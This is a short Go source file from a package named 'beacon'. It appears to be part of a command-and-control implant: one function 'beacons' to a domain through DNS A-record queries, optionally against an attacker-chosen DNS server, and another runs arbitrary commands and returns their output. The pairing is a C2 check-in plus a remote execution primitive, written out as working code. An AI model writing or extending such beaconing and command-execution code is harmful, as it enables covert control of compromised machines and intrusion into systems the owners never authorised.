package beacon

import (
	"os/exec"
	"strconv"
	"net"
	"fmt"
	"log"
	"github.com/miekg/dns"
)

//returns IP address of first A record
func dnsAQuery(ip string, port int, domain string) string {
	log.Printf("Beaconing to %s", domain)
	if ip == "0.0.0.0" {
		//IP address for DNS Server is not provided
		//Use configured local DNS Server to resolve DNS query
		resp, err := net.LookupIP(domain)
		if err != nil {
			fmt.Println(err)
		}

		for _, ip := range resp {
			if ip.To4() != nil {
				return ip.String()
			}
		}
	} else {
		//IP address for DNS Server is provided
		c := dns.Client{}
	    m := dns.Msg{}

	    m.SetQuestion(domain + ".", dns.TypeA)
		in, _, _ := c.Exchange(&m, ip + ":" + strconv.Itoa(port))

		if a, ok := in.Answer[0].(*dns.A); ok {
			return a.A.String()
		}
	}
	return "0.0.0.0"	
}


// Execute a given filename.
func run(command string) string {
	cmd := exec.Command(command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "error"
	}
	return string(out)
}
